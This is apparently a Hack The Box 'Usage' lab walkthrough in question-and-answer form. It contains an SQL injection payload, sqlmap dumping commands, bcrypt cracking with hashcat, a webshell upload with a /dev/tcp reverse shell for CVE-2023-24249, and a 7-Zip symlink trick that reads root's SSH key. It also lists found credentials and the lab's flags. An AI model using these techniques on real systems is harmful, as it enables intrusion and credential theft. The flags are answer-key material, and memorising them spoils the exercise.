## Guided:
**Q:** How many open TCP ports are listening on Usage?<br>
**A:** 2

**Q:** What domain name is a subdomain of usage.htb that returns a different page than the default redirect to usage.htb?<br>
**A:** admin.usage.htb

**Q:** What PHP web framework is the website written with?<br>
**A:** laravel <br>
> `Whatweb hints it`

**Q:** What is the HTTP POST parameter that is vulnerable to SQL injection?<br>
**A:** email (From the "reset password")
> Note: specificly this payload worked for me <br> `admin' or 1=1;-- -`
> and sqlmap did the rest with the request file,<br>
> `python3 sqlmap.py -r ~/HTB/Usage/req -p email --dbs --batch --level 3 --threads=10` <br>

**Q:** How many tables are in the usage_blog database?<br>
**A:** 15
> `python3 sqlmap.py -r ~/HTB/Usage/req -p email -D usage_blog --tables --batch --level 3 --threads=10`

**Q:** What is the admin user's password to the admin website?<br>
**A:** whatever1
> Note: cracked the pass i got from mysql, it was `bcrypt $2*$, Blowfish (Unix)` <br>
> `hashcat -m 3200 -a 0 <pass file> -w <wordlist>` <br>
> `$2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2:whatever1`

**Q:** What PHP package is responsible for the admin panel?<br>
**A:** laravel-admin<br>
> (it was the only one in the dashboard with version without `^`)

**Q:** What is the 2023 CVE ID for an arbitrary file upload vulnerability that leads to remote code execution in this version of Laravel-Admin?<br>
**A:** CVE-2023-24249<br>
> Note: all was needed is to upload an webshell as img,example 'img.jpg',<br> intercept it with burp and add .php to the ending of the file name,<br> base64 encode /dev/tcp and let it return back to me.<br> 
> [Hint](https://flyd.uk/post/cve-2023-24249/) <br>
> Also found db creds:<br>
> DB_USERNAME=staff <br>
> DB_PASSWORD=s3cr3t_c0d3d_1uth

**Q:** What user is the webserver running as on Usage?<br>
**A:** dash

**Q:** Submit the flag located in the dash user's home directory.<br>
**A:** d9c8a6560b30788db2cb18c7530c5c97

**Q:** What is the xander user's password on Usage?<br>
**A:** 3nc0d3d_pa$$w0rd<br>
> Found in a hidden file in home directory, named `.monitrc`

**Q:** What is the full path of the file that xander can run as any user without a password on Usage?<br>
**A:** /usr/bin/usage_management

**Q:** Which option in usage_management invokes 7Zip?<br>
**A:** 1
> `strings /usr/bin/usage_management`

**Q:** What is the full command line for 7Zip when it is invoked by usage_management?
**A:** /usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- *
> Note: it created a backup on the dir /var/www/html,<br> had to make a link file to root's ssh.<br>
> `touch @id_rsa` ((also referred to as a listfile) tells 7zip that id_rsa contains a list of files to be compressed)<br>
> `ln -s /root/.ssh/id_rsa id_rsa` 7za will read the content of the ssh key instead of backup. (not sure why)

**Q:** What is the full path to the root user's private SSH key?`<br>
**A:** /root/.ssh/id_rsa

**Q:** Submit the flag located in the root user's home directory.
**A:** 2b28cc49318e6a9ac83f0f936f3ac07b
